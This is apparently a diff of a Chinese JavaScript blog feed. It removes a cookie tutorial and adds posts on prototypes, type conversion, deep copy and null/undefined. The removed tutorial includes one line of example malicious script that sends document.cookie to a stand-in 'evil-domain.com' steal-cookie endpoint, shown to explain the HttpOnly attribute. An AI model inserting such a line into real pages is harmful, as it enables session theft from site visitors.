-  console.log(document.cookie)
-&lt;/script&gt;
-&lt;/html&gt;
-</code></pre>
-<p>server.js</p>
-<pre><code class="language-js">const http = require('http')
-const fs = require('fs')
-
-http.createServer(function (request, response) {
-  console.log('request come', request.url)
-
-  if (request.url === '/') {
-    const html = fs.readFileSync('test.html', 'utf8')
-    response.writeHead(200, {
-      'Content-Type': 'text/html',
-      'Set-Cookie': ['id=123; max-age=2', 'abc=456;domain=test.com']
-    })
-    response.end(html)
-  }
-
-}).listen(8888)
-
-console.log('server listening on 8888')
-</code></pre>
-<h2 id="发送">发送</h2>
-<p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p>
-<pre><code class="language-http">Cookie: foo=bar
-</code></pre>
-<p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p>
-<p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p>
-<pre><code class="language-http">Cookie: name=value; name2=value2; name3=value3
-</code></pre>
-<p>下面是一个例子。</p>
-<pre><code class="language-http">GET /sample_page.html HTTP/1.1
-Host: www.example.org
-Cookie: yummy_cookie=choco; tasty_cookie=strawberry
-</code></pre>
-<p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p>
-<ul>
-<li>Cookie 的各种属性，比如何时过期。</li>
-<li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li>
-</ul>
-<h2 id="属性">属性</h2>
-<h3 id="expiresmax-age">Expires，Max-Age</h3>
-<p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p>
-<pre><code class="language-http">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
-</code></pre>
-<p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p>
-<p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p>
-<p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p>
-<p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p>
-<h3 id="domainpath">Domain，Path</h3>
-<p><code>Domain</code>属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如<code>www.example.com</code>会设为<code>example.com</code>，而且以后如果访问<code>example.com</code>的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在<code>Set-Cookie</code>字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。</p>
-<p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>PATH</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是域名必须一致。</p>
-<h3 id="securehttponly">Secure，HttpOnly</h3>
-<p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p>
-<p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>Document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p>
-<pre><code class="language-js">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;
-</code></pre>
-<p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p>
-<h2 id="documentcookie">document.cookie</h2>
-<p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p>
-<p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p>
-<pre><code class="language-js">document.cookie // &quot;foo=bar;baz=bar&quot;
-</code></pre>
-<p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p>
-<pre><code class="language-js">var cookies = document.cookie.split(';');
-
-for (var i = 0; i &lt; cookies.length; i++) {
-  console.log(cookies[i]);
+<p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong>）。该原型对象也有一个自己的原型对象（<strong>proto</strong>），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p>
+<h2 id="推荐阅读">推荐阅读</h2>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">MDN-prototype_chain</a></p>
+<p><a href="https://wangdoc.com/javascript/oop/prototype.html">阮一峰</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JavaScript-类的继承和原型]]></title>
+        <id>https://leecss.com/post/javascript-yuan-xing/</id>
+        <link href="https://leecss.com/post/javascript-yuan-xing/">
+        </link>
+        <updated>2021-08-28T23:56:49.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
+<p>继承的实现和js的原型</p>
+<h2 id="类">类</h2>
+<pre><code class="language-js">// 类
+class Student {
+    constructor(name, number) {
+        this.name = name
+        this.number = number
+    }
+    sayHi() {
+        console.log(
+            `姓名 ${this.name} ，学号 ${this.number}`
+        )
+    }
 }
-// foo=bar
-// baz=bar
+
+// 通过类 new 对象/实例
+const xialuo = new Student('夏洛', 100)
+console.log(xialuo.name)
+console.log(xialuo.number)
+xialuo.sayHi()
+
+const madongmei = new Student('马冬梅', 101)
+console.log(madongmei.name)
+console.log(madongmei.number)
+madongmei.sayHi()
+
 </code></pre>
-<p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p>
-<pre><code class="language-js">document.cookie = 'fontSize=14';
+<h2 id="用类实现继承">用类实现继承</h2>
+<pre><code class="language-js">// 父类
+class People {
+    constructor(name) {
+        this.name = name
+    }
+    eat() {
+        console.log(`${this.name} eat something`)
+    }
+}
+
+// 子类
+class Student extends People {
+    constructor(name, number) {
+        super(name)
+        this.number = number
+    }
+    sayHi() {
+        console.log(`姓名 ${this.name} 学号 ${this.number}`)
+    }
+}
+
+// 子类
+class Teacher extends People {
+    constructor(name, major) {
+        super(name)
+        this.major = major
+    }
+    teach() {
+        console.log(`${this.name} 教授 ${this.major}`)
+    }
+}
+
+// 实例
+const xialuo = new Student('夏洛', 100)
+console.log(xialuo.name)
+console.log(xialuo.number)
+xialuo.sayHi()
+xialuo.eat()
+
+// 实例
+const wanglaoshi = new Teacher('王老师', '语文')
+console.log(wanglaoshi.name)
+console.log(wanglaoshi.major)
+wanglaoshi.teach()
+wanglaoshi.eat()
+
 </code></pre>
-<p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p>
-<p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p>
-<pre><code class="language-js">document.cookie = 'test1=hello';
-document.cookie = 'test2=world';
-document.cookie
-// test1=hello;test2=world
+<h2 id="原型关系">原型关系</h2>
+<pre><code class="language-js">// class实际上是函数，可见是语法糖
+typeof People // 'function'
+typeof Student // 'function'
+
+// 隐式原型和显式原型
+console.log(xialuo.__proto__)
+/**
+ * People
+ *  constructor: class Student
+ *  sayHi: ƒ sayHi()
+ *  [[Prototype]]: Object
+*/
+console.log(Student.prototype)
+/**
+ * People
+ *  constructor: class Student
+ *  sayHi: ƒ sayHi()
+ *  [[Prototype]]: Object
+*/
+console.log(xialuo.__proto__ === Student.prototype) // true
 </code></pre>
-<p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p>
-<p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p>
-<pre><code class="language-js">document.cookie = &quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;;
+<p>每个class都有显式原型 prototype<br>
+每个实例都有隐式原型 <code>__proto__</code><br>
+实例的隐式原型 <code>__proto__</code> 指向class的显式原型prototype</p>
+<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1630195055419.jpg" alt="" loading="lazy"></figure>
+<h2 id="基于原型的执行规则">基于原型的执行规则</h2>
+<p>获取属性xialuo.name 或执行方法xialuo.sayhi()时</p>
+<p>先在自身属性和方法找</p>
+<p>如果找不到则去<code>__proto__</code>中找</p>
+<h2 id="原型链">原型链</h2>
+<figure data-type="image" tabindex="2"><img src="https://leecss.com/post-images/1630196768351.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JavaScript-类型转换]]></title>
+        <id>https://leecss.com/post/javascript-lei-xing-zhuan-huan/</id>
+        <link href="https://leecss.com/post/javascript-lei-xing-zhuan-huan/">
+        </link>
+        <updated>2021-08-27T08:04:43.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
+<p>显式转化类型</p>
+<h2 id="分类">分类</h2>
+<h3 id="数字转字符串">数字转字符串</h3>
+<h4 id="一元的加号操作符">一元的加号操作符</h4>
+<pre><code class="language-js">'' + 10 === '10'; // true
 </code></pre>
-<p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p>
-<p>各个属性的写入注意点如下。</p>
+<h4 id="tostring">toString()</h4>
+<p>语法：<code>number.toString(radix)</code><br>
+radix：规定表示数字的基数，是 2 ~ 36 之间的整数。</p>
+<pre><code class="language-js">var num = 15;
+var a = num.toString(); // 15
+var b = num.toString(2); // 1111
+var c = num.toString(8); // 17
+var d = num.toString(16); // f
+</code></pre>
+<h3 id="字符串转数字">字符串转数字</h3>
+<pre><code class="language-js">+'010' === 10
+Number('010') === 10
+parseInt('010', 10) === 10  // 用来转换为整数
+
++'010.2' === 10.2
+Number('010.2') === 10.2
+parseInt('010.2', 10) === 10
+</code></pre>
+<h4 id="一元的加号操作符-2">一元的加号操作符</h4>
+<pre><code class="language-js">+'10' === 10; // true
+</code></pre>
+<h4 id="parseint">parseInt()</h4>
+<p>语法：<code>parseInt(string, radix)</code><br>
+string：要被解析的字符串；<br>
+radix：表示要解析的数字的基数。该值介于 2 ~ 36 之间。</p>
+<pre><code class="language-js">parseInt(&quot;10&quot;);         //返回 10
+parseInt(&quot;19&quot;,10);      //返回 19 (10+9)
+parseInt(&quot;11&quot;,2);       //返回 3 (2+1)
+parseInt(&quot;17&quot;,8);       //返回 15 (8+7)
+parseInt(&quot;1f&quot;,16);      //返回 31 (16+15)
+parseInt(&quot;010&quot;);        //未定：返回 10 或 8
+</code></pre>
+<h4 id="number">Number()</h4>
+<pre><code class="language-js">Number('010') === 10
+Number('010.2') === 10.2
+</code></pre>
+<h3 id="其他类型转布尔值">其他类型转布尔值</h3>
+<h4 id="">!!</h4>
+<p>通过使用 <strong>否</strong> 操作符两次，可以把一个值转换为布尔型。</p>
+<pre><code class="language-js">!!'foo';   // true
+!!'';      // false
+!!'0';     // true
+!!'1';     // true
+!!'-1'     // true
+!!{};      // true
+!!true;    // true
+</code></pre>
+<h4 id="boolean">Boolean()</h4>
+<p>除了undefined、null、0、-0、NaN、''会被转换成false，其他的值都会转换成true。</p>
+<pre><code class="language-js">let a = Boolean(null); // false
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ js手写-深拷贝]]></title>
+        <id>https://leecss.com/post/js-shou-xie-shen-kao-bei/</id>
+        <link href="https://leecss.com/post/js-shou-xie-shen-kao-bei/">
+        </link>
+        <updated>2021-08-27T01:40:01.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
+<p><strong>什么是深拷贝？</strong></p>
+<p>浅拷贝(Shallow Copy)、深拷贝(Deep Copy)只存在于<em>引用类型</em>中 (基本数据类型是按值访问的，操作保存的是实际的值)<br>
+<strong>区别</strong>：是否是真正获取了一个对象的复制实体，而不是引用。<br>
+<strong>赋值</strong>： 只复制了指向对象的指针，改变对象会互相影响。<br>
+<strong>浅拷贝</strong>： 只复制对象一层，改变引用对象还会互相影响。<br>
+<strong>深拷贝</strong>： 完全复制对象的值，改变对象不会互相影响。</p>
+<p>基本类型： Boolean、Number、String、Null、Undefined、Symbol、BigInt</p>
+<pre><code class="language-js">var num1 = 1;
+var num2 = num1;
+// num1: 1
+// num2: 1
+num2 = 2;
+// num1: 1
+// num2: 2
+</code></pre>
+<p>引用类型： Object</p>
+<pre><code class="language-js">var obj1 = {x: 1, y: 2};
+var obj2 = obj1;
+// obj1: {x: 1, y: 2}
+// obj2: {x: 1, y: 2}
+obj2.x = 2;
+// obj1: {x: 2, y: 2}
+// obj2: {x: 2, y: 2}
+</code></pre>
+<h2 id="简易版">简易版</h2>
+<pre><code class="language-js">/**
+ * 深拷贝
+ */
+
+const obj1 = {
+    age: 20,
+    name: 'xxx',
+    address: {
+        city: 'beijing'
+    },
+    arr: ['a', 'b', 'c']
+}
+
+const obj2 = deepClone(obj1)
+obj2.address.city = 'shanghai'
+obj2.arr[0] = 'a1'
+console.log(obj1.address.city)
+console.log(obj1.arr[0])
+
+/**
+ * 深拷贝
+ * @param {Object} obj 要拷贝的对象
+ */
+function deepClone(obj = {}) {
+    if (typeof obj !== 'object' || obj == null) {
+        // obj 是 null ，或者不是对象和数组，直接返回
+        return obj
+    }
+
+    // 初始化返回结果
+    let result
+    if (obj instanceof Array) {
+        result = []
+    } else {
+        result = {}
+    }
+
+    for (let key in obj) {
+        // 保证 key 不是原型的属性
+        if (obj.hasOwnProperty(key)) {
+            // 递归调用！！！
+            result[key] = deepClone(obj[key])
+        }
+    }
+
+    // 返回结果
+    return result
+}
+
+</code></pre>
+<h2 id="深入版">深入版</h2>
+<pre><code class="language-js">const mapTag = '[object Map]';
+const setTag = '[object Set]';
+const arrayTag = '[object Array]';
+const objectTag = '[object Object]';
+const argsTag = '[object Arguments]';
+
+const boolTag = '[object Boolean]';
+const dateTag = '[object Date]';
+const numberTag = '[object Number]';
+const stringTag = '[object String]';
+const symbolTag = '[object Symbol]';
+const errorTag = '[object Error]';
+const regexpTag = '[object RegExp]';
+const funcTag = '[object Function]';
+
+const deepTag = [mapTag, setTag, arrayTag, objectTag, argsTag];
+
+
+function forEach(array, iteratee) {
+    let index = -1;
+    const length = array.length;
+    while (++index &lt; length) {
+        iteratee(array[index], index);
+    }
+    return array;
+}
+
+function isObject(target) {
+    const type = typeof target;
+    return target !== null &amp;&amp; (type === 'object' || type === 'function');
+}
+
+function getType(target) {
+    return Object.prototype.toString.call(target);
+}
+
+function getInit(target) {
+    const Ctor = target.constructor;
+    return new Ctor();
+}
+
+function cloneSymbol(targe) {
+    return Object(Symbol.prototype.valueOf.call(targe));
+}
+
+function cloneReg(targe) {
+    const reFlags = /\w*$/;
+    const result = new targe.constructor(targe.source, reFlags.exec(targe));
+    result.lastIndex = targe.lastIndex;
+    return result;
+}
+
+function cloneFunction(func) {
+    const bodyReg = /(?&lt;={)(.|\n)+(?=})/m;
+    const paramReg = /(?&lt;=\().+(?=\)\s+{)/;
+    const funcString = func.toString();
+    if (func.prototype) {
+        const param = paramReg.exec(funcString);
+        const body = bodyReg.exec(funcString);
+        if (body) {
+            if (param) {
+                const paramArr = param[0].split(',');
+                return new Function(...paramArr, body[0]);
+            } else {
+                return new Function(body[0]);
+            }
+        } else {
+            return null;
+        }
+    } else {
+        return eval(funcString);
+    }
+}
+
+function cloneOtherType(targe, type) {
+    const Ctor = targe.constructor;
+    switch (type) {
+        case boolTag:
+        case numberTag:
+        case stringTag:
+        case errorTag:
+        case dateTag:
+            return new Ctor(targe);
+        case regexpTag:
+            return cloneReg(targe);
+        case symbolTag:
+            return cloneSymbol(targe);
+        case funcTag:
+            return cloneFunction(targe);
+        default:
+            return null;
+    }
+}
+
+function clone(target, map = new WeakMap()) {
+
+    // 克隆原始类型
+    if (!isObject(target)) {
+        return target;
+    }
+
+    // 初始化
+    const type = getType(target);
+    let cloneTarget;
+    if (deepTag.includes(type)) {
+        cloneTarget = getInit(target, type);
+    } else {
+        return cloneOtherType(target, type);
+    }
+
+    // 防止循环引用
+    if (map.get(target)) {
+        return map.get(target);
+    }
+    map.set(target, cloneTarget);
+
+    // 克隆set
+    if (type === setTag) {
+        target.forEach(value =&gt; {
+            cloneTarget.add(clone(value, map));
+        });
+        return cloneTarget;
+    }
+
+    // 克隆map
+    if (type === mapTag) {
+        target.forEach((value, key) =&gt; {
+            cloneTarget.set(key, clone(value, map));
+        });
+        return cloneTarget;
+    }
+
+    // 克隆对象和数组
+    const keys = type === arrayTag ? undefined : Object.keys(target);
+    forEach(keys || target, (value, key) =&gt; {
+        if (keys) {
+            key = value;
+        }
+        cloneTarget[key] = clone(target[key], map);
+    });
+
+    return cloneTarget;
+}
+
+module.exports = {
+    clone
+};
+
+</code></pre>
+<h2 id="推荐阅读">推荐阅读</h2>
+<p><a href="http://www.conardli.top/blog/article/JS%E8%BF%9B%E9%98%B6/%E5%A6%82%E4%BD%95%E5%86%99%E5%87%BA%E4%B8%80%E4%B8%AA%E6%83%8A%E8%89%B3%E9%9D%A2%E8%AF%95%E5%AE%98%E7%9A%84%E6%B7%B1%E6%8B%B7%E8%B4%9D.html">如何写出一个惊艳面试官的深拷贝</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ JavaScript-隐式类型转换]]></title>
+        <id>https://leecss.com/post/javascript-yin-shi-lei-xing-zhuan-huan/</id>
+        <link href="https://leecss.com/post/javascript-yin-shi-lei-xing-zhuan-huan/">
+        </link>
+        <updated>2021-08-26T08:54:29.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
+<p>类型转换分为两种，隐式转换即程序自动进行的类型转换，强制转换即我们手动进行的类型转换。</p>
+<h2 id="隐式转换">隐式转换</h2>
+<h3 id="类型转换规则">类型转换规则</h3>
+<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1629968151232.png" alt="" loading="lazy"></figure>
+<h3 id="if语句和逻辑运算">if语句和逻辑运算</h3>
+<h4 id="turly变量和falsely变量">turly变量和falsely变量</h4>
+<p>turly变量：<code>!!a===true</code>的变量</p>
+<p>falsely变量：<code>!!a===false</code>的变量</p>
+<h4 id="falsely变量">falsely变量</h4>
+<p>以下是falsely变量，除此以外都是truly变量</p>
+<pre><code>0
+NaN
+''
+null
+undefined
+false
+</code></pre>
+<p>即</p>
+<pre><code class="language-js">!!0 === false
+!!NaN === false
+!!'' === false
+!!null === false
+!!undefined === false
+!!false === false
+</code></pre>
+<h4 id="if语句">if语句</h4>
+<p>if语句中判断的就是turly变量和falsely变量</p>
+<pre><code class="language-js">// truly变量
+const a = true
+if (a) {
+
+}
+const b = 100
+if (b) {
+
+}
+
+// false变量
+const c = ''
+if (c) {
+
+}
+const d = null
+if (d) {
+
+}
+let e
+if (e) {
+  
+}
+</code></pre>
+<h4 id="逻辑判断">逻辑判断</h4>
+<pre><code class="language-js">// 逻辑判断
+console.log(10 &amp;&amp; 0) // 0
+console.log('' || 'abc') // 'abc'
+console.log(!window.abc) // true
+</code></pre>
+<h3 id="各种数学运算符">各种数学运算符</h3>
+<h4 id="数学运算符-">数学运算符(<code>- * /</code>)</h4>
+<p>我们在对各种非<code>Number</code>类型运用数学运算符(<code>- * /</code>)时，会先将非<code>Number</code>类型转换为<code>Number</code>类型;</p>
+<pre><code class="language-js">1 - true // 0
+1 - null //  1
+1 * undefined //  NaN
+2 * ['5'] //  10
+</code></pre>
+<h4 id="操作符"><code>+</code>操作符</h4>
 <ul>
-<li><code>path</code>属性必须为绝对路径，默认为当前路径。</li>
-<li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li>
-<li><code>max-age</code>属性的值为秒数。</li>
-<li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li>
+<li>1.当一侧为<code>String</code>类型，被识别为字符串拼接，并会优先将另一侧转换为字符串类型。</li>
+<li>2.当一侧为<code>Number</code>类型，另一侧为原始类型，则将原始类型转换为<code>Number</code>类型。</li>
+<li>3.当一侧为<code>Number</code>类型，另一侧为引用类型，将引用类型和<code>Number</code>类型转换成字符串后拼接。</li>
 </ul>
-<p><code>document.cookie</code>写入 Cookie 的例子如下。</p>
-<pre><code class="language-js">document.cookie = 'fontSize=14; '
-  + 'expires=' + someDate.toGMTString() + '; '
-  + 'path=/subdirectory; '
-  + 'domain=*.example.com';
+<pre><code class="language-js">123 + '123' // 123123   （规则1）
+123 + null  // 123    （规则2）
+123 + true // 124    （规则2）
+123 + {}  // 123[object Object]    （规则3）
 </code></pre>
-<p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p>
-<p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p>
-<pre><code class="language-js">document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
+<h3 id="">==</h3>
+<p>使用<code>==</code>时，若两侧类型相同，则比较结果和<code>===</code>相同，否则会发生隐式转换，使用<code>==</code>时发生的转换可以分为几种不同的情况（只考虑两侧类型不同）：</p>
+<h4 id="nan">NaN</h4>
+<p><code>NaN</code>和其他任何类型比较永远返回<code>false</code>(包括和他自己)。</p>
+<pre><code class="language-js">NaN == NaN // false
 </code></pre>
-<p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p>
-<h2 id="特点">特点</h2>
-<h3 id="不可跨域">不可跨域</h3>
-<p>每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用</p>
-<p><strong>一级域名和二级域名之间是允许共享使用的</strong>（<strong>靠的是 domain）</strong>。</p>
-<h2 id="转载">转载</h2>
+<h4 id="boolean">Boolean</h4>
+<p><code>Boolean</code>和其他任何类型比较，<code>Boolean</code>首先被转换为<code>Number</code>类型。</p>
+<pre><code class="language-js">true == 1  // true 
+true == '2'  // false
+true == ['1']  // true
+true == ['2']  // false
+</code></pre>
+<p>这里注意一个可能会弄混的点：<code>undefined、null</code>和<code>Boolean</code>比较，虽然<code>undefined、null</code>和<code>false</code>都很容易被想象成假值，但是他们比较结果是<code>false</code>，原因是<code>false</code>首先被转换成<code>0</code>：</p>
+<pre><code class="language-js">undefined == false // false
+null == false // false
+</code></pre>
+<h4 id="string和number">String和Number</h4>
+<p><code>String</code>和<code>Number</code>比较，先将<code>String</code>转换为<code>Number</code>类型。</p>
+<pre><code class="language-js">123 == '123' // true
+'' == 0 // true
+</code></pre>
+<h4 id="null和undefined">null和undefined</h4>
+<p><code>null == undefined</code>比较结果是<code>true</code>，除此之外，<code>null、undefined</code>和其他任何结果的比较值都为<code>false</code>。</p>
+<pre><code class="language-js">null == undefined // true
+null == '' // false
+null == 0 // false
+null == false // false
+undefined == '' // false
+undefined == 0 // false
+undefined == false // false
+</code></pre>
+<h4 id="原始类型和引用类型">原始类型和引用类型</h4>
+<p>当原始类型和引用类型做比较时，对象类型会依照<code>ToPrimitive</code>规则转换为原始类型:</p>
+<pre><code class="language-js">  '[object Object]' == {} // true
+  '1,2,3' == [1, 2, 3] // true
+</code></pre>
+<p>来看看下面这个比较：</p>
+<pre><code class="language-js">[] == ![] // true
+</code></pre>
+<p><code>!</code>的优先级高于<code>==</code>，<code>![]</code>首先会被转换为<code>false</code>，然后根据上面第三点，<code>false</code>转换成<code>Number</code>类型<code>0</code>，左侧<code>[]</code>转换为<code>0</code>，两侧比较相等。</p>
+<pre><code class="language-js">[null] == false // true
+[undefined] == false // true
+</code></pre>
+<p>根据数组的<code>ToPrimitive</code>规则，数组元素为<code>null</code>或<code>undefined</code>时，该元素被当做空字符串处理，所以<code>[null]、[undefined]</code>都会被转换为<code>0</code>。</p>
+<h4 id="何时使用">何时使用</h4>
+<p>除了 == null 之外，其他都一律使用 ===</p>
+<pre><code class="language-js">const obj = { x: 100 }
+if (obj.a == null) { }
+// 相当于：
+// if (obj.a === null || obj.a === undefined) { }
+</code></pre>
+<h2 id="推荐阅读">推荐阅读</h2>
+<p><a href="http://www.conardli.top/blog/article/JS%E8%BF%9B%E9%98%B6/%E4%BD%A0%E7%9C%9F%E7%9A%84%E6%8E%8C%E6%8F%A1%E5%8F%98%E9%87%8F%E5%92%8C%E7%B1%BB%E5%9E%8B%E4%BA%86%E5%90%97%EF%BC%88%E4%BA%8C%EF%BC%89%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.html#%E4%B8%83%E3%80%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">类型转换</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JavaScript-null和undefined]]></title>
+        <id>https://leecss.com/post/javascript-null-he-undefined/</id>
+        <link href="https://leecss.com/post/javascript-null-he-undefined/">
+        </link>
+        <updated>2021-08-26T03:17:30.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
+<p><code>null</code>与<code>undefined</code>都可以表示“没有”，含义非常相似。将一个变量赋值为<code>undefined</code>或<code>null</code>，老实说，语法效果几乎没区别。</p>
+<pre><code class="language-js">var a = undefined;
+// 或者
+var a = null;
+</code></pre>
+<p>上面代码中，变量<code>a</code>分别被赋值为<code>undefined</code>和<code>null</code>，这两种写法的效果几乎等价。</p>
+<p>在<code>if</code>语句中，它们都会被自动转为<code>false</code>，相等运算符（<code>==</code>）甚至直接报告两者相等。</p>
+<pre><code class="language-js">if (!undefined) {
+  console.log('undefined is false');
+}
+// undefined is false
+
+if (!null) {
+  console.log('null is false');
+}
+// null is false
+
+undefined == null
+// true
+</code></pre>
+<p>既然含义与用法都差不多，为什么要同时设置两个这样的值，这不是无端增加复杂度，令初学者困扰吗？这与历史原因有关。</p>
+<p>1995年 JavaScript 诞生时，最初像 Java 一样，只设置了<code>null</code>表示&quot;无&quot;。根据 C 语言的传统，<code>null</code>可以自动转为<code>0</code>。</p>
+<pre><code class="language-js">Number(null) // 0
+5 + null // 5
+</code></pre>
+<p>上面代码中，<code>null</code>转为数字时，自动变成0。</p>
+<p>但是，JavaScript 的设计者 Brendan Eich，觉得这样做还不够。首先，第一版的 JavaScript 里面，<code>null</code>就像在 Java 里一样，被当成一个对象，Brendan Eich 觉得表示“无”的值最好不是对象。其次，那时的 JavaScript 不包括错误处理机制，Brendan Eich 觉得，如果<code>null</code>自动转为0，很不容易发现错误。</p>
+<p>因此，他又设计了一个<code>undefined</code>。区别是这样的：<code>null</code>是一个表示“空”的对象，转为数值时为<code>0</code>；<code>undefined</code>是一个表示&quot;此处无定义&quot;的原始值，转为数值时为<code>NaN</code>。</p>
+<pre><code class="language-js">Number(undefined) // NaN
+5 + undefined // NaN
+</code></pre>
+<h2 id="undefined">undefined</h2>
+<h3 id="重新赋值与void-0">重新赋值与void 0</h3>
 <blockquote>
-<p>阮一峰</p>
-<p><a href="https://javascript.ruanyifeng.com/bom/cookie.html">https://javascript.ruanyifeng.com/bom/cookie.html</a></p>
+<p>为什么有的编程规范要求用 void 0 代替 undefined？</p>
+<p>这个语言也定义了一个全局变量，它的值是 <code>undefined</code>，这个变量也被称为 <code>undefined</code>。 但是这个变量<strong>不是</strong>一个常量，也不是一个关键字。这意味着它的<em>值</em>可以轻易被覆盖。</p>
+</blockquote>
+<p>Undefined 类型表示未定义，它的类型只有一个值，就是 undefined。任何变量在赋值前是 Undefined 类型、值为 undefined，一般我们可以用全局变量 undefined（就是名为 undefined 的这个变量）来表达这个值，或者 void 运算来把任意一个表达式变成 undefined 值。</p>
+<p>但是呢，因为 JavaScript 的代码 undefined 是一个变量，而并非是一个关键字，这是 JavaScript 语言公认的设计失误之一，所以，我们为了避免无意中被篡改，我建议使用 void 0 来获取 undefined 值。</p>
+<p>我实际验证了一下，全局变量中无法被赋值，但在函数作用域中可以被赋值。</p>
+<pre><code class="language-js">// 全局作用域
+var undefined = 123
+console.log(undefined) // undefined
+
+// 函数作用域
+(function(){
+  var undefined = 123
+  console.log(undefined) // 123
+})()
+
+function part() {
+  var undefined = 123
+  console.log(undefined) // 123
+}
+part()
+
+// void 0
+(function(){  
+  console.log(void 0) // undefined
+})()
+</code></pre>
